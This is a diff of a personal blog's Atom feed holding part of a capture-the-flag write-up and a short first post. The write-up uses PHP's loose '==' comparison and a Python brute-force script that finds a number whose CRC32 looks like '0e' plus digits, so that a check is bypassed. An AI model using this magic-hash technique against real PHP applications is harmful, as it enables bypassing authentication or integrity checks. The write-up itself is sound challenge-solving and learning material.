+</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>As you see, to solve this challenge, we have to find a <code>value</code> , which is not <code>ecTmZcC</code> but its crc32 is equal to <code>ecTmZcC</code>&rsquo;s crc32 :|</p>
+
+<p>Seem like crazy, right ?</p>
+
+<p>Or you can think more positive: is something wrong with  <code>==</code> in php (php is famous for that) ?
+The key is <a href="https://blog.whitehatsec.com/magic-hashes/">Magic Hash</a></p>
+
+<p><code>ecTmZcC</code>&rsquo;s crc32 is <code>0e730435</code>. So, we must calculate a value which has crc32 hash similar &lsquo;0eXXXXXX&rsquo; (X is numeric).</p>
+
+<p>I write a Python script to find it.</p>
+
+<div class='bogus-wrapper'><notextile><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>!#/usr/bin/python2.7
+</span><span class='line'>import binascii
+</span><span class='line'>
+</span><span class='line'>def CRC32(buf):    
+</span><span class='line'>    buf = (binascii.crc32(buf) & 0xFFFFFFFF)
+</span><span class='line'>    return "%08X" % buf
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>def chk(s, p):
+</span><span class='line'>  if s[:2] != p:
+</span><span class='line'>      return False
+</span><span class='line'>  for c in s[2:]:
+</span><span class='line'>      if '0' &lt;= c &lt;= '9':
+</span><span class='line'>          ok = 1
+</span><span class='line'>      else:
+</span><span class='line'>          return False
+</span><span class='line'>  return True
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>if __name__ == '__main__':
+</span><span class='line'>  pattern = CRC32('ecTmZcC')[:2]  # 0e
+</span><span class='line'>  i = 0
+</span><span class='line'>  while True:
+</span><span class='line'>      if chk(CRC32(str(i)), pattern):         
+</span><span class='line'>          print 'value:', i
+</span><span class='line'>          break   
+</span><span class='line'>      i += 1      </span></code></pre></td></tr></table></div></figure></notextile></div>
+
+
+<p>Finally, we have the answer: <strong>6586</strong> and got flag :D</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[First Post]]></title>
+    <link href="http://tungpun.github.io/blog/2015/08/06/first-post/"/>
+    <updated>2015-08-06T16:15:43+07:00</updated>
+    <id>http://tungpun.github.io/blog/2015/08/06/first-post</id>
+    <content type="html"><![CDATA[<blockquote><p>Hello octopress, ruby, rake, markdown, blogging !</p></blockquote>
+]]></content>
+  </entry>
+  
+</feed>
